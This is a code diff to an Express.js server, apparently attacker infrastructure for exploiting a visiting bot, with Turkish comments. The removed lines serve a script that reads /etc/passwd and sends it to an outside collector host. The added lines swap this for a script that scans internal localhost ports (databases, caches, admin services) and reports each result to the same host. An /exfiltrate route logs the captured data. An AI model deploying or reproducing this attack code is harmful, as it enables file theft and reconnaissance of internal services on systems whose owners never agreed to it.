@@ -5,26 +5,31 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 app.get('/redirect', (req, res) => {
-    console.log("\n--- BOT Yakalandı! File Read Payload Gönderiliyor ---");
+    console.log("\n--- BOT Yakalandı! Genişletilmiş İç Servis Taraması Başlatılıyor ---");
     
     const htmlPayload = `
     <html>
       <body>
-        <h2>Loading...</h2>
+        <h2>Scanning internal services...</h2>
         <script>
-          // Linux sistemler için klasik /etc/passwd dosyası veya test dosyaları
-          const targetInternalUrl = "file:///etc/passwd";
+          // Genişletilmiş iç port listesi (Web, Veritabanı, Önbellek, Admin servisleri)
+          const internalPorts = [
+            80, 443, 3000, 5000, 6379, 8080, 8443, 8888, 9000, 11211, 27017
+          ];
           
-          fetch(targetInternalUrl)
-            .then(response => response.text())
-            .then(data => {
-               // Başarılı olursa içeriği exfiltrate rotasına post ediyoruz
-               fetch('https://collab-67oj.onrender.com/exfiltrate?success=true&data=' + encodeURIComponent(data));
-            })
-            .catch(error => {
-               // Hata durumunda hatayı yakalıyoruz
-               fetch('https://collab-67oj.onrender.com/exfiltrate?success=false&error=' + encodeURIComponent(error.toString()));
-            });
+          internalPorts.forEach(port => {
+            const targetUrl = "http://127.0.0.1:" + port + "/";
+            
+            fetch(targetUrl, { mode: 'no-cors' })
+              .then(response => {
+                // Eğer hata fırlatmazsa veya yanıt dönerse bildir
+                fetch('https://collab-67oj.onrender.com/exfiltrate?status=success&port=' + port);
+              })
+              .catch(error => {
+                // Hata türünü ayırt etmek için hata mesajını gönderiyoruz
+                fetch('https://collab-67oj.onrender.com/exfiltrate?status=error&port=' + port + '&err=' + encodeURIComponent(error.toString()));
+              });
+          });
         </script>
       </body>
     </html>
@@ -35,8 +40,7 @@ app.get('/redirect', (req, res) => {
 });
 
 app.get('/exfiltrate', (req, res) => {
-    console.log("\n🔥 --- FILE READ / SIZDIRMA YANITI --- 🔥");
-    console.log("Query Parametreleri:", req.query);
+    console.log("Servis Tarama Sonucu:", req.query);
     return res.status(200).send("OK");
 });
 
